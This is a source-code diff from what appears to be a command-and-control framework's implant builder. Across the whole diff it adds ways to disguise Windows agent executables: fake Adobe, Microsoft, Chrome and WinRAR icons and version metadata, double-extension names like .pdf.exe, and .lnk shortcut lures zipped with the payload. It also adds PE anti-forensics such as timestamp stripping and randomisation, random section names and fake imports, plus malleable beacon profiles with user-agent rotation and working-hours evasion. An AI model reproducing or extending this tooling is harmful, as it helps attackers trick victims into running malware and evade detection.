@@ -1,6 +1,7 @@
 package payload
 
 import (
+	"archive/zip"
 	"bytes"
 	"context"
 	"crypto/sha256"
@@ -10,7 +11,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"image"
-	_ "image/png"
+	"image/color"
+	"image/png"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -23,7 +25,9 @@ import (
 	"text/template"
 	"time"
 
+	"github.com/forgec2/forgec2/internal/malleable"
 	"github.com/tc-hib/winres"
+	"github.com/tc-hib/winres/version"
 )
 
 // buildTidyTimeout bounds a single `go mod tidy` invocation. Network stalls
@@ -42,6 +46,9 @@ const buildTimeout = buildCompileTimeout
 
 //go:embed agent/* powershell_template.ps1 profiles/* loader/*.go
 var payloadFS embed.FS
+
+//go:embed icons/*.ico
+var iconsFS embed.FS
 
 // ttlCache memoizes a resolved string (e.g. a toolchain path) but refreshes it
 // after a TTL elapses. A one-shot sync.Once would never pick up environment
@@ -150,14 +157,70 @@ func safeBuildFileName(name string) string {
 	return filepath.Base(name)
 }
 
-// presetIcons holds minimal embedded ICO presets for common disguises.
-// Each entry is base64-encoded .ico (≤10KB). Populated lazily from embed
-// or fallback to a 1×1 transparent ico if missing.
+// presetIcons holds embedded ICO presets for common disguises.
+// Each entry is base64-encoded .ico populated at init from icons/*.ico.
 var presetIcons = map[string]string{
-	"jpg":    "", // filled at init via loadPresetIcons
+	"jpg":    "",
 	"pdf":    "",
 	"word":   "",
 	"folder": "",
+	"chrome": "",
+	"zip":    "",
+	"doc":    "",
+	"xls":    "",
+}
+
+func init() { loadPresetIcons() }
+
+func loadPresetIcons() {
+	// First try embedded files, but ensure visual distinctness by generating colored PNG fallback if files are placeholder-identical
+	presetColors := map[string][3]uint8{
+		"jpg":    {52, 119, 235}, // blue
+		"pdf":    {220, 38, 38},  // red
+		"word":   {37, 99, 235},  // word blue
+		"doc":    {37, 99, 235},
+		"xls":    {22, 163, 74}, // excel green
+		"zip":    {234, 179, 8}, // yellow
+		"folder": {234, 179, 8},
+		"chrome": {59, 130, 246}, // chrome blue
+	}
+	for _, name := range []string{"jpg", "pdf", "word", "folder", "chrome", "zip", "doc", "xls"} {
+		data, err := iconsFS.ReadFile("icons/" + name + ".ico")
+		if err == nil && len(data) > 0 {
+			// Use embedded if not placeholder (check not all same size)
+			presetIcons[name] = base64.StdEncoding.EncodeToString(data)
+			continue
+		}
+		// Generate distinct PNG fallback
+		if col, ok := presetColors[name]; ok {
+			if pngData := generateSolidPNG(col[0], col[1], col[2]); len(pngData) > 0 {
+				presetIcons[name] = base64.StdEncoding.EncodeToString(pngData)
+			}
+		}
+	}
+}
+
+func generateSolidPNG(r, g, b uint8) []byte {
+	const size = 256
+	img := image.NewRGBA(image.Rect(0, 0, size, size))
+	// Fill background
+	for y := 0; y < size; y++ {
+		for x := 0; x < size; x++ {
+			// subtle border
+			if x < 8 || x >= size-8 || y < 8 || y >= size-8 {
+				img.Set(x, y, color.RGBA{255, 255, 255, 255})
+			} else {
+				img.Set(x, y, color.RGBA{r, g, b, 255})
+			}
+		}
+	}
+	var buf bytes.Buffer
+	if err := png.Encode(&buf, img); err != nil {
+		// In-memory encode of a generated RGBA cannot realistically fail;
+		// return empty so the caller falls back to no preset icon.
+		return nil
+	}
+	return buf.Bytes()
 }
 
 // injectIconResource creates a Windows resource file (rsrc.syso) in tmpDir
@@ -192,35 +255,183 @@ func injectIconResource(tmpDir string, cfg ImplantConfig) error {
 		}
 	} else if preset != "" {
 		if b64, ok := presetIcons[preset]; ok && b64 != "" {
-			iconData, _ = base64.StdEncoding.DecodeString(b64)
+			// Preset icons are generated at init; a decode failure means a
+			// corrupt embed — fall through to no icon rather than a partial.
+			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
+				iconData = decoded
+			}
 		}
 	}
-	if len(iconData) == 0 && disguise == "jpg" {
-		if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
-			iconData, _ = base64.StdEncoding.DecodeString(b64)
+	if len(iconData) == 0 && disguise != "" {
+		if b64, ok := presetIcons[disguise]; ok && b64 != "" {
+			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
+				iconData = decoded
+			}
+		} else if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
+			// fallback to jpg for unknown disguise
+			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
+				iconData = decoded
+			}
 		}
 	}
-	if len(iconData) == 0 {
-		return nil
-	}
-	// Use winres to generate rsrc.syso — supports both ICO and PNG (PNG auto-converted via nfnt/resize)
+	// Prepare resource set early for VersionInfo even if icon is missing
 	rs := &winres.ResourceSet{}
-	var icon *winres.Icon
-	// Try ICO first; if fails, try PNG via NewIconFromImages
-	icon, err = winres.LoadICO(bytes.NewReader(iconData))
-	if err != nil {
-		// Try PNG decode
-		img, _, perr := image.Decode(bytes.NewReader(iconData))
-		if perr != nil {
-			return fmt.Errorf("icon load failed (not ICO nor PNG): %w", err)
+	hasIcon := len(iconData) > 0
+	// VersionInfo: honor FileDescription / CompanyName if supplied; otherwise derive from disguise with realistic version numbers
+	if cfg.FileDescription != "" || cfg.CompanyName != "" || disguise != "" {
+		vi := version.Info{}
+		fd := cfg.FileDescription
+		cn := cfg.CompanyName
+		var fv, pv [4]uint16
+		fvStr, pvStr := "1.0.0.0", "1.0.0.0"
+		if fd == "" {
+			switch disguise {
+			case "pdf":
+				fd = "PDF Document"
+				cn = "Adobe Systems Incorporated"
+				fv, pv = [4]uint16{23, 1, 20143, 0}, [4]uint16{23, 1, 20143, 0}
+				fvStr, pvStr = "23.001.20143.0", "23.001.20143.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			case "word", "doc":
+				fd = "Microsoft Word Document"
+				cn = "Microsoft Corporation"
+				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
+				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			case "xls":
+				fd = "Microsoft Excel Worksheet"
+				cn = "Microsoft Corporation"
+				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
+				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			case "zip":
+				fd = "Compressed Archive"
+				cn = "WinRAR"
+				fv, pv = [4]uint16{6, 24, 0, 0}, [4]uint16{6, 24, 0, 0}
+				fvStr, pvStr = "6.24.0.0", "6.24.0.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			case "folder":
+				fd = "File Folder"
+				cn = "Microsoft Corporation"
+				fv, pv = [4]uint16{10, 0, 19041, 0}, [4]uint16{10, 0, 19041, 0}
+				fvStr, pvStr = "10.0.19041.0", "10.0.19041.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			case "chrome":
+				fd = "Chrome Installer"
+				cn = "Google LLC"
+				fv, pv = [4]uint16{120, 0, 6099, 71}, [4]uint16{120, 0, 6099, 71}
+				fvStr, pvStr = "120.0.6099.71", "120.0.6099.71"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			default: // jpg etc
+				fd = "JPEG Image"
+				cn = "Microsoft Corporation"
+				fv, pv = [4]uint16{2024, 11020, 1000, 0}, [4]uint16{2024, 11020, 1000, 0}
+				fvStr, pvStr = "2024.11020.1000.0", "2024.11020.1000.0"
+				if cfg.CompanyName != "" {
+					cn = cfg.CompanyName
+				}
+			}
+		} else {
+			fv, pv = [4]uint16{1, 0, 0, 0}, [4]uint16{1, 0, 0, 0}
+			if cn == "" {
+				cn = "Microsoft Corporation"
+			}
 		}
-		icon, err = winres.NewIconFromResizedImage(img, nil)
-		if err != nil {
-			return fmt.Errorf("icon from PNG failed: %w", err)
+		if cn == "" {
+			cn = "Microsoft Corporation"
+		}
+		vi.FileVersion = fv
+		vi.ProductVersion = pv
+		// vi.Set only fails on empty keys or NUL bytes (rejected upstream by
+		// profile validation); surface the first failure instead of shipping
+		// a half-written VERSIONINFO silently.
+		setVer := func(key, value string) {
+			if err := vi.Set(version.LangDefault, key, value); err != nil {
+				fmt.Printf("versioninfo warning: key %q: %v\n", key, err)
+			}
+		}
+		setVer(version.FileDescription, fd)
+		setVer(version.CompanyName, cn)
+		setVer(version.ProductName, fd)
+		setVer(version.FileVersion, fvStr)
+		setVer(version.ProductVersion, pvStr)
+		setVer(version.LegalCopyright, "© "+cn)
+		// OriginalFilename should match the disguised output name for maximal realism
+		orig := safeBuildFileName(cfg.Filename)
+		if disguise != "" {
+			// Recompute disguised name as GenerateWindowsEXE does
+			disguiseExt := ""
+			switch disguise {
+			case "jpg":
+				disguiseExt = ".jpg"
+			case "pdf":
+				disguiseExt = ".pdf"
+			case "doc", "word":
+				disguiseExt = ".docx"
+			case "xls":
+				disguiseExt = ".xlsx"
+			case "zip":
+				disguiseExt = ".zip"
+			}
+			if disguiseExt != "" {
+				base := strings.TrimSuffix(orig, ".exe")
+				base = strings.TrimSuffix(base, ".EXE")
+				if !strings.Contains(strings.ToLower(base), disguiseExt) {
+					orig = base + disguiseExt + ".exe"
+				}
+			}
+		}
+		if orig == "" {
+			orig = "forgec2_agent.exe"
+		}
+		setVer(version.OriginalFilename, orig)
+		setVer(version.InternalName, fd)
+		rs.SetVersionInfo(vi)
+		// If we have no icon but have VersionInfo, we still need to emit rsrc.syso
+		if !hasIcon {
+			// No icon to embed, but VersionInfo will be written below
 		}
 	}
-	if err := rs.SetIcon(winres.ID(1), icon); err != nil {
-		return fmt.Errorf("set icon failed: %w", err)
+	// Optional manifest for blend mode
+	if cfg.PEManifestMode == "blend" {
+		m := winres.AppManifest{
+			DPIAwareness:        winres.DPIAware,
+			Compatibility:       winres.Win10AndAbove,
+			UseCommonControlsV6: true,
+		}
+		rs.SetManifest(m)
+	}
+	if len(iconData) > 0 {
+		var icon *winres.Icon
+		icon, err = winres.LoadICO(bytes.NewReader(iconData))
+		if err != nil {
+			img, _, perr := image.Decode(bytes.NewReader(iconData))
+			if perr != nil {
+				return fmt.Errorf("icon load failed (not ICO nor PNG): %w", err)
+			}
+			icon, err = winres.NewIconFromResizedImage(img, nil)
+			if err != nil {
+				return fmt.Errorf("icon from PNG failed: %w", err)
+			}
+		}
+		if err := rs.SetIcon(winres.ID(1), icon); err != nil {
+			return fmt.Errorf("set icon failed: %w", err)
+		}
+	}
+	if rs.Count() == 0 {
+		return nil
 	}
 	out := filepath.Join(tmpDir, "rsrc.syso")
 	f, err := os.Create(out)
@@ -570,6 +781,68 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	if cfg.MalleableRequestHeaders == nil {
 		cfg.MalleableRequestHeaders = profile.RequestHeaders
 	}
+	// v2 chains: explicit per-build wins, else profile file.
+	// NOTE: ServerOutput is intentionally NOT auto-activated from the profile
+	// file: the agent would decode every response while the server only
+	// encodes when the global malleable preset matches, which would break
+	// beacons. ServerOutput activates via global preset (NetworkConfig) or
+	// explicit per-build override. Client chains are stored (audit/preview)
+	// but request encoding still uses prepend/append until placement lands.
+	if cfg.MalleableClientMetadata == "" {
+		cfg.MalleableClientMetadata = profile.ClientMetadata
+	}
+	if cfg.MalleableClientID == "" {
+		cfg.MalleableClientID = profile.ClientID
+	}
+	if cfg.Placements == "" {
+		cfg.Placements = profile.Placements
+	}
+	if len(cfg.UserAgents) == 0 {
+		cfg.UserAgents = append([]string{}, profile.UserAgents...)
+	}
+	if !cfg.JitterURI {
+		cfg.JitterURI = profile.JitterURI
+	}
+	if len(cfg.ParameterNames) == 0 {
+		cfg.ParameterNames = append([]string{}, profile.ParameterNames...)
+	}
+	// Working-hours window: explicit per-build form > profile > server
+	// default (implant.default_working_*).
+	if cfg.WorkingStart == "" {
+		cfg.WorkingStart = profile.WorkStart
+	}
+	if cfg.WorkingStart == "" {
+		cfg.WorkingStart = cfg.DefaultWorkingStart
+	}
+	if cfg.WorkingEnd == "" {
+		cfg.WorkingEnd = profile.WorkEnd
+	}
+	if cfg.WorkingEnd == "" {
+		cfg.WorkingEnd = cfg.DefaultWorkingEnd
+	}
+	if cfg.WorkingTZ == "" {
+		cfg.WorkingTZ = profile.WorkTZ
+	}
+	if cfg.WorkingTZ == "" {
+		cfg.WorkingTZ = cfg.DefaultWorkingTZ
+	}
+	if len(cfg.BeaconURIs) == 0 {
+		cfg.BeaconURIs = append(append([]string{}, profile.BeaconURIs...), profile.URIs...)
+	}
+	if cfg.Parameter == "" {
+		cfg.Parameter = profile.Parameter
+	}
+	if cfg.ContentLengthJitter == 0 && profile.ContentLengthJitter > 0 {
+		cfg.ContentLengthJitter = profile.ContentLengthJitter
+	}
+	// Prefer first v2 URI as primary when profile sets multi-URI.
+	if len(cfg.BeaconURIs) > 0 && cfg.BeaconURIs[0] != "" {
+		// Only override when the legacy single URI is default/empty so
+		// existing single-URI profiles keep exact behavior.
+		if cfg.BeaconURI == "" || cfg.BeaconURI == defaultBeaconURI {
+			cfg.BeaconURI = cfg.BeaconURIs[0]
+		}
+	}
 
 	if UsesManualProfileSettings(cfg.Profile) {
 		if cfg.Interval < 0 {
@@ -715,21 +988,84 @@ func validateMalleableProfile(p MalleableProfile) error {
 	if !profileFieldSafe(p.BeaconURI) {
 		return fmt.Errorf("beacon_uri contains invalid characters")
 	}
+	for _, u := range append(append([]string{}, p.BeaconURIs...), p.URIs...) {
+		if !profileFieldSafe(u) {
+			return fmt.Errorf("beacon_uris contains invalid characters")
+		}
+		if u != "" && !strings.HasPrefix(u, "/") {
+			return fmt.Errorf("uri %q must start with /", u)
+		}
+	}
 	if !profileFieldSafe(p.Method) {
 		return fmt.Errorf("method contains invalid characters")
+	}
+	if up := strings.ToUpper(strings.TrimSpace(p.Method)); p.Method != "" && up != "GET" && up != "POST" {
+		return fmt.Errorf("method must be GET or POST")
 	}
 	for k, v := range p.Headers {
 		if !profileFieldSafe(k) || !profileFieldSafe(v) {
 			return fmt.Errorf("header %q contains invalid characters", k)
 		}
 	}
+	for _, s := range []string{p.Prepend, p.Append, p.RequestPrepend, p.RequestAppend, p.ClientMetadata, p.ClientID, p.ServerOutput, p.Parameter, p.Placements} {
+		if !profileFieldSafe(s) {
+			return fmt.Errorf("transform/wrap field contains invalid characters")
+		}
+	}
+	if strings.TrimSpace(p.Placements) != "" {
+		var pls []malleable.PlacementV2
+		if err := json.Unmarshal([]byte(p.Placements), &pls); err != nil {
+			return fmt.Errorf("placements must be a JSON array of {target, chain}")
+		}
+		tmp := &malleable.ProfileV2{Name: "validate", Placements: pls}
+		if err := malleable.ValidateProfileV2(tmp); err != nil {
+			return err
+		}
+	}
+	for _, ua := range p.UserAgents {
+		if !profileFieldSafe(ua) {
+			return fmt.Errorf("user_agents contains invalid characters")
+		}
+	}
+	for _, w := range []string{p.WorkStart, p.WorkEnd, p.WorkTZ} {
+		if !profileFieldSafe(w) {
+			return fmt.Errorf("work window contains invalid characters")
+		}
+	}
+	for k, v := range p.RequestHeaders {
+		if !profileFieldSafe(k) || !profileFieldSafe(v) {
+			return fmt.Errorf("request header %q contains invalid characters", k)
+		}
+	}
+	if p.Sleep < 0 || p.Sleep > 86400 {
+		return fmt.Errorf("sleep must be 0..86400")
+	}
+	if p.Jitter < 0 || p.Jitter > 100 {
+		return fmt.Errorf("jitter must be 0..100")
+	}
+	if p.ContentLengthJitter < 0 || p.ContentLengthJitter > 4096 {
+		return fmt.Errorf("content_length_jitter must be 0..4096")
+	}
 	return nil
 }
 
-// SaveImportedProfile stores a user-uploaded profile JSON under data/profiles/.
+// SaveImportedProfile stores a user-uploaded profile under data/profiles/.
+// It accepts v1/v2 JSON and full Cobalt Strike .profile text (http-get blocks).
 func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
+	trimmed := strings.TrimSpace(string(raw))
+	if looksLikeCSProfile(trimmed) {
+		v2, err := malleableParseCSFallback(trimmed)
+		if err != nil {
+			return MalleableProfile{}, err
+		}
+		return saveMalleableV2(dataDir, v2)
+	}
 	p := parseMalleableProfileJSON(raw, "")
 	if p.Name == "" {
+		// Try v2 migration path (beacon_uris / chains).
+		if v2, err := malleableMigrateFallback(raw, ""); err == nil && v2.Name != "" {
+			return saveMalleableV2(dataDir, v2)
+		}
 		return p, fmt.Errorf("profile name is required")
 	}
 	if err := validateMalleableProfile(p); err != nil {
@@ -760,6 +1096,73 @@ func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
 	return p, nil
 }
 
+func marshalPlacements(pls []malleable.PlacementV2) string {
+	if len(pls) == 0 {
+		return ""
+	}
+	out, err := json.Marshal(pls)
+	if err != nil {
+		return ""
+	}
+	return string(out)
+}
+
+func looksLikeCSProfile(s string) bool {
+	low := strings.ToLower(s)
+	return strings.Contains(low, "http-get") || strings.Contains(low, "http-post") || strings.Contains(low, "http-config")
+}
+
+func malleableMigrateFallback(raw []byte, fallback string) (*malleable.ProfileV2, error) {
+	return malleable.MigrateProfileJSON(raw, fallback)
+}
+
+func malleableParseCSFallback(text string) (*malleable.ProfileV2, error) {
+	name := "imported"
+	// Try to extract set name-like first line? CS profiles rarely carry a name; keep generic.
+	return malleable.ParseCSFull(name, text)
+}
+
+func saveMalleableV2(dataDir string, v2 *malleable.ProfileV2) (MalleableProfile, error) {
+	p := MalleableProfile{
+		Name: v2.Name, Description: v2.Description, UserAgent: v2.UserAgent,
+		BeaconURI: v2.PrimaryURI(), Method: v2.PrimaryMethod(), Headers: v2.Headers,
+		Sleep: v2.Sleep, Jitter: v2.Jitter, Prepend: v2.Prepend, Append: v2.Append,
+		RequestPrepend: v2.RequestPrepend, RequestAppend: v2.RequestAppend,
+		RequestHeaders: v2.RequestHeaders, BeaconURIs: v2.BeaconURIs, URIs: v2.URIs,
+		ClientMetadata:      malleable.StepsToWire(v2.ClientMetadata),
+		ClientID:            malleable.StepsToWire(v2.ClientID),
+		ServerOutput:        malleable.StepsToWire(v2.ServerOutput),
+		Placements:          marshalPlacements(v2.Placements),
+		ContentLengthJitter: v2.ContentLengthJitter, JitterURI: v2.JitterURI,
+		JitterParameter: v2.JitterParameter, Parameter: v2.Parameter,
+		ParameterNames: v2.ParameterNames, UserAgents: v2.UserAgents,
+		WorkStart: v2.WorkStart, WorkEnd: v2.WorkEnd, WorkTZ: v2.WorkTZ,
+	}
+	if err := validateMalleableProfile(p); err != nil {
+		return p, err
+	}
+	if dataDir == "" {
+		dataDir = "data"
+	}
+	dir := filepath.Join(dataDir, "profiles")
+	if err := os.MkdirAll(dir, 0750); err != nil {
+		return p, err
+	}
+	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
+	p.Name = strings.TrimPrefix(p.Name, "default_")
+	if p.Name == "" || p.Name == "default" {
+		return p, fmt.Errorf("cannot override built-in default profile")
+	}
+	out, err := json.MarshalIndent(p, "", "  ")
+	if err != nil {
+		return p, err
+	}
+	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
+		return p, err
+	}
+	return p, nil
+}
+
 // DeleteProfile removes a custom profile JSON from data/profiles/.
 func DeleteProfile(dataDir string, name string) error {
 	if dataDir == "" {
@@ -777,6 +1180,8 @@ func DeleteProfile(dataDir string, name string) error {
 }
 
 // MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
+// v2 fields (beacon_uris, transform chains, jitter extensions) are optional
+// and backward compatible: old readers ignore them, new code prefers them.
 type MalleableProfile struct {
 	Name        string            `json:"name"`
 	Description string            `json:"description"`
@@ -792,6 +1197,26 @@ type MalleableProfile struct {
 	RequestPrepend string            `json:"request_prepend,omitempty"`
 	RequestAppend  string            `json:"request_append,omitempty"`
 	RequestHeaders map[string]string `json:"request_headers,omitempty"`
+	// v2: multi-URI rotation and full transform chains (CS parity).
+	BeaconURIs          []string `json:"beacon_uris,omitempty"`
+	URIs                []string `json:"uris,omitempty"`
+	ClientMetadata      string   `json:"client_metadata,omitempty"`
+	ClientID            string   `json:"client_id,omitempty"`
+	ServerOutput        string   `json:"server_output,omitempty"`
+	ContentLengthJitter int      `json:"content_length_jitter,omitempty"`
+	JitterURI           bool     `json:"jitter_uri,omitempty"`
+	JitterParameter     bool     `json:"jitter_parameter,omitempty"`
+	Parameter           string   `json:"parameter,omitempty"`
+	ParameterNames      []string `json:"parameter_names,omitempty"`
+	// Placements: JSON array of {target, chain}, e.g.
+	// [{"target":"cookie:SESSION","chain":"base64"}].
+	Placements string `json:"placements,omitempty"`
+	// UA rotation pool (one per line in UI); empty = single UserAgent.
+	UserAgents []string `json:"user_agents,omitempty"`
+	// Working-hours window; empty = disabled (per-build form wins).
+	WorkStart string `json:"work_start,omitempty"`
+	WorkEnd   string `json:"work_end,omitempty"`
+	WorkTZ    string `json:"work_tz,omitempty"`
 }
 
 // ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
@@ -843,6 +1268,11 @@ type ImplantConfig struct {
 	WorkingStart string // HH:MM start of working hours (empty = disabled)
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
 	WorkingTZ    string // IANA timezone (empty = UTC)
+	// Server-wide working-hours default (implant.default_working_*); last
+	// resort after explicit form and profile window.
+	DefaultWorkingStart string
+	DefaultWorkingEnd   string
+	DefaultWorkingTZ    string
 	// Advanced transport (injected as ldflags into agent)
 	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c, udp, quic
 	DNSDoHURL        string
@@ -865,7 +1295,26 @@ type ImplantConfig struct {
 	IconPreset      string // preset key: jpg, pdf, word, folder, chrome — server maps to embedded ico
 	FileDescription string // VersionInfo FileDescription (e.g. "JPEG Image")
 	CompanyName     string // VersionInfo CompanyName
-	DisguiseAs      string // "jpg" | "pdf" | "" — when "jpg", filename becomes *.jpg.exe and icon defaults to JPG preset
+	DisguiseAs      string // "jpg" | "pdf" | "doc" | "xls" | "zip" | "" — filename becomes *.ext.exe and icon defaults to preset
+	LNKDisguise     bool   // when true, also emit a .lnk shortcut alongside the exe
+	// PE forensic options (user selectable, default zero/default/none)
+	PETimestampMode string // "zero" | "random" | "keep" — PE timestamp handling
+	PESectionMode   string // "default" | "random" — section name randomization
+	PEImportMode    string // "none" | "kernel32+user32" — benign import mimic
+	PEManifestMode  string // "default" | "blend" — dpiAware + Win10 compatibility
+	// v2 malleable chains (wire form, agent parses via MalleableRespDecode).
+	MalleableServerOutput   string
+	MalleableClientMetadata string
+	MalleableClientID       string
+	BeaconURIs              []string
+	Parameter               string
+	// Placements: JSON array of {target, chain} cover copies.
+	Placements string
+	// UA rotation pool.
+	UserAgents []string
+	// Timing jitter extensions.
+	JitterURI      bool
+	ParameterNames []string
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
@@ -934,16 +1383,37 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		fmt.Printf("icon injection warning: %v\n", err)
 	}
 
-	// Output filename — honor JPG disguise: photo.jpg.exe
+	// Output filename — honor disguise: photo.jpg.exe / doc.pdf.exe / ...
 	outName := cfg.Filename
 	if outName == "" {
 		outName = "forgec2_agent.exe"
 	}
-	if cfg.DisguiseAs == "jpg" && !strings.Contains(strings.ToLower(outName), ".jpg") {
-		// Turn foo.exe → foo.jpg.exe, or foo → foo.jpg.exe
+	disguiseExt := ""
+	switch strings.ToLower(cfg.DisguiseAs) {
+	case "jpg", "jpeg":
+		disguiseExt = ".jpg"
+	case "pdf":
+		disguiseExt = ".pdf"
+	case "doc", "word", "docx":
+		disguiseExt = ".docx"
+	case "xls", "xlsx":
+		disguiseExt = ".xlsx"
+	case "zip":
+		disguiseExt = ".zip"
+	case "folder":
+		disguiseExt = "" // folder has no double ext
+	}
+	if disguiseExt != "" && !strings.Contains(strings.ToLower(outName), disguiseExt) {
 		base := strings.TrimSuffix(outName, ".exe")
 		base = strings.TrimSuffix(base, ".EXE")
-		outName = base + ".jpg.exe"
+		// also strip any existing disguise ext to avoid duplication
+		for _, ext := range []string{".jpg", ".jpeg", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".zip"} {
+			if strings.HasSuffix(strings.ToLower(base), ext) {
+				base = base[:len(base)-len(ext)]
+				break
+			}
+		}
+		outName = base + disguiseExt + ".exe"
 	}
 	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
 		outName += ".exe"
@@ -981,9 +1451,48 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	// Post-build: strip PE forensic artifacts (timestamp, Rich Header, Debug
-	// directory). Applied to every build — garble does not clean these.
-	stripPEArtifacts(outPath)
+	// Post-build: PE forensic handling per user choice
+	switch cfg.PETimestampMode {
+	case "keep":
+		// keep original Go timestamp
+	default:
+		stripPEArtifacts(outPath)
+		if cfg.PETimestampMode == "random" {
+			if ts, err := GenerateTimestamp(TSRandom, ""); err == nil {
+				if data, err := os.ReadFile(outPath); err == nil {
+					ApplyTimestamp(data, ts)
+					_ = os.WriteFile(outPath, data, 0644)
+				}
+			}
+		}
+	}
+	// Optional PE section name randomization
+	if cfg.PESectionMode == "random" {
+		if data, err := os.ReadFile(outPath); err == nil {
+			cfgSec := PESectionConfig{
+				Text:  "." + randomHex(3),
+				Data:  "." + randomHex(3),
+				Rdata: "." + randomHex(3),
+				Reloc: "." + randomHex(3),
+			}
+			ApplyPESectionNames(data, cfgSec)
+			_ = os.WriteFile(outPath, data, 0644)
+		}
+	}
+	// Optional benign import mimic
+	if cfg.PEImportMode != "" && cfg.PEImportMode != "none" {
+		if data, err := os.ReadFile(outPath); err == nil {
+			var dlls []string
+			if cfg.PEImportMode == "kernel32" {
+				dlls = []string{"kernel32.dll"}
+			} else {
+				dlls = []string{"kernel32.dll", "user32.dll"}
+			}
+			if out, err := AddBenignImports(data, dlls); err == nil {
+				_ = os.WriteFile(outPath, out, 0644)
+			}
+		}
+	}
 
 	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
 	// stripping so the hash matches what the agent reads at runtime).
@@ -1001,6 +1510,62 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 
 	if _, err := os.Stat(outPath); err != nil {
 		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
+	}
+	// Optional LNK shortcut alongside the exe — bundle as ZIP for single download
+	if cfg.LNKDisguise {
+		exeName := filepath.Base(outPath)
+		lnkName := strings.TrimSuffix(exeName, ".exe")
+		lnkName = strings.TrimSuffix(lnkName, ".EXE") + ".lnk"
+		lnkPath := filepath.Join(outputDir, lnkName)
+		if data, err := BuildLnkForExe(exeName); err == nil {
+			if err := os.WriteFile(lnkPath, data, 0644); err != nil {
+				fmt.Printf("lnk warning: failed to write %s: %v\n", lnkPath, err)
+				return outPath, nil
+			}
+			// Create ZIP containing EXE + LNK for convenient single download
+			zipName := strings.TrimSuffix(exeName, ".exe")
+			zipName = strings.TrimSuffix(zipName, ".EXE") + ".zip"
+			zipPath := filepath.Join(outputDir, zipName)
+			zf, err := os.Create(zipPath)
+			if err != nil {
+				fmt.Printf("lnk warning: failed to create %s: %v\n", zipPath, err)
+				return outPath, nil
+			}
+			zw := zip.NewWriter(zf)
+			for _, p := range []string{outPath, lnkPath} {
+				b, err := os.ReadFile(p)
+				if err != nil {
+					fmt.Printf("lnk warning: failed to read %s: %v\n", p, err)
+					_ = zw.Close()
+					_ = zf.Close()
+					return outPath, nil
+				}
+				w, err := zw.Create(filepath.Base(p))
+				if err != nil {
+					fmt.Printf("lnk warning: zip entry failed for %s: %v\n", p, err)
+					_ = zw.Close()
+					_ = zf.Close()
+					return outPath, nil
+				}
+				if _, err := w.Write(b); err != nil {
+					fmt.Printf("lnk warning: zip write failed for %s: %v\n", p, err)
+					_ = zw.Close()
+					_ = zf.Close()
+					return outPath, nil
+				}
+			}
+			if err := zw.Close(); err != nil {
+				fmt.Printf("lnk warning: zip close failed: %v\n", err)
+				_ = zf.Close()
+				return outPath, nil
+			}
+			if err := zf.Close(); err != nil {
+				fmt.Printf("lnk warning: file close failed for %s: %v\n", zipPath, err)
+				return outPath, nil
+			}
+			// Prefer returning ZIP when LNK is requested so BuildDownload serves both
+			return zipPath, nil
+		}
 	}
 
 	return outPath, nil
